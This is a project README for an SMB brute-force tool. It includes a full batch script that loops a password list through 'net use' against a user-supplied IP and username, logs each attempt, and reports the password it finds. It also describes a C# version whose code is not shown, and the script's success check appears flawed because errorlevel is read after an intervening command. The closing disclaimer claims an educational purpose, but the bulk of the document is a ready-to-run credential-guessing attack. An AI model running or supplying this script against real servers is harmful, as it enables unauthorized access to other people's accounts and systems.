# SMB Bruteforce 2.0v
This C# application performs a brute force attack on SMB (Server Message Block) to try and discover a user's password on a remote server. Originally a .bat script, it has been converted to C# for improved readability and efficiency. The application prompts the user for the target IP address, username, and the path to a password list file. It then attempts to authenticate to the SMB server using each password from the list, logging the details of each attempt.

### .BAT CODE
```bat
@echo off
title SMB Bruteforce - by Lira
color A
echo.
setlocal enabledelayedexpansion

:validate_ip
set "ip=%~1"
for /f "tokens=1-4 delims=." %%a in ("%ip%") do (
    if %%a lss 0 set valid_ip=0
    if %%a gtr 255 set valid_ip=0
    if %%b lss 0 set valid_ip=0
    if %%b gtr 255 set valid_ip=0
    if %%c lss 0 set valid_ip=0
    if %%c gtr 255 set valid_ip=0
    if %%d lss 0 set valid_ip=0
    if %%d gtr 255 set valid_ip=0
)
if defined valid_ip (
    echo Invalid IP address. Please enter a valid IP address.
    exit /b 1
)
goto :eof

:input
set /p ip="Enter IP Address: "
call :validate_ip %ip%
set /p user="Enter Username: "
set /p wordlist="Enter Password List (with full path): "
if not exist "%wordlist%" (
    echo Password list file not found. Please enter a valid file path.
    exit /b 1
)

setlocal enabledelayedexpansion
for /f %%a in ('find /c /v "" ^<"%wordlist%"') do set total=%%a
set /a progress=0

set log="bruteforce_log.txt"
echo SMB Bruteforce Log > %log%
echo Target IP: %ip% >> %log%
echo Username: %user% >> %log%
echo Wordlist: %wordlist% >> %log%
echo. >> %log%

set /a count=1
for /f "usebackq tokens=*" %%a in ("%wordlist%") do (
    set "pass=%%a"
    call :attempt
    set /a progress+=1
    set /a percent=(progress*100)/total
    <nul set /p "=Progress: !percent!%% [!progress! / !total! attempts]" 
    echo.
)
echo Password not Found :(
echo Password not Found :( >> %log%
pause
exit

:success
echo.
echo Password Found! !pass!
echo Password Found! !pass! >> %log%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% "!pass!" >nul 2>&1
echo [ATTEMPT !count!] [!pass!]
echo [ATTEMPT !count!] [!pass!] >> %log%
set /a count+=1
if !errorlevel! EQU 0 goto success
goto :eof
```

## Features
The program begins by setting up the console and collecting user inputs. It validates the provided IP address to ensure it is in the correct format, comprising four numbers between 0 and 255. After validating the IP address, the application reads the passwords from the provided list and initiates the brute force process. Each authentication attempt is made using the net use command, and the exit code of this command is checked to determine if the attempt was successful. All results, including successful and unsuccessful attempts, are logged in a detailed log file.

## Prerequisites
To compile and run this C# application, you will need the `.NET Framework`. Additionally, since the net use commands require `administrative privileges`, ensure that you have the necessary permissions to execute these commands.

## Example Usage
When you run the program, it will prompt you to enter the target `IP address`, the `username`, and the full path to your `password list` file. For example:
```
Enter IP Address: 192.168.56.255
Enter Username: admin
Enter Password List (with full path): C:\passwords.txt
```
The program will then attempt to authenticate to the SMB server using each password from the provided list. Progress will be displayed in the console, and each attempt will be logged. If the correct password is found, a success message will be displayed and logged.

## Code Structure
The Main method is responsible for setting up the console and collecting user inputs. It then validates the IP address, reads the password list, and initiates the brute force process. The Prompt method is used to display messages and read user inputs, while the ValidateIP method checks if the provided IP address is valid. The AttemptLogin method executes the net use command to attempt authentication and checks the exit code to determine if the authentication was successful.
### Explanation of Key Components
**Main Method:**

- Sets the console title and color.
- Prompts the user for IP address, username, and the path to the password list.
- Validates the IP address format.
- Reads passwords from the provided file.
- Initiates the brute force process and logs results.

**Prompt Method:**

- Displays a message and reads the user's input.
- This method simplifies the process of collecting input from the user.

**ValidateIP Method:**

- Splits the IP address into its components.
- Checks if each component is a number between 0 and 255.
- Returns true if the IP address is valid, otherwise returns false.

**AttemptLogin Method:**

- Constructs the command to attempt SMB login using net use.
- Configures the process to run the command silently.
- Executes the command and waits for it to finish.
- Returns true if the login attempt was successful (exit code 0), otherwise returns false.

## ⚠️ Legal Disclaimer
This code was created for educational purposes and testing in controlled environments. Using this code on servers or networks without permission is illegal and can result in severe penalties. Use it responsibly and always obtain permission before conducting security tests on any system.
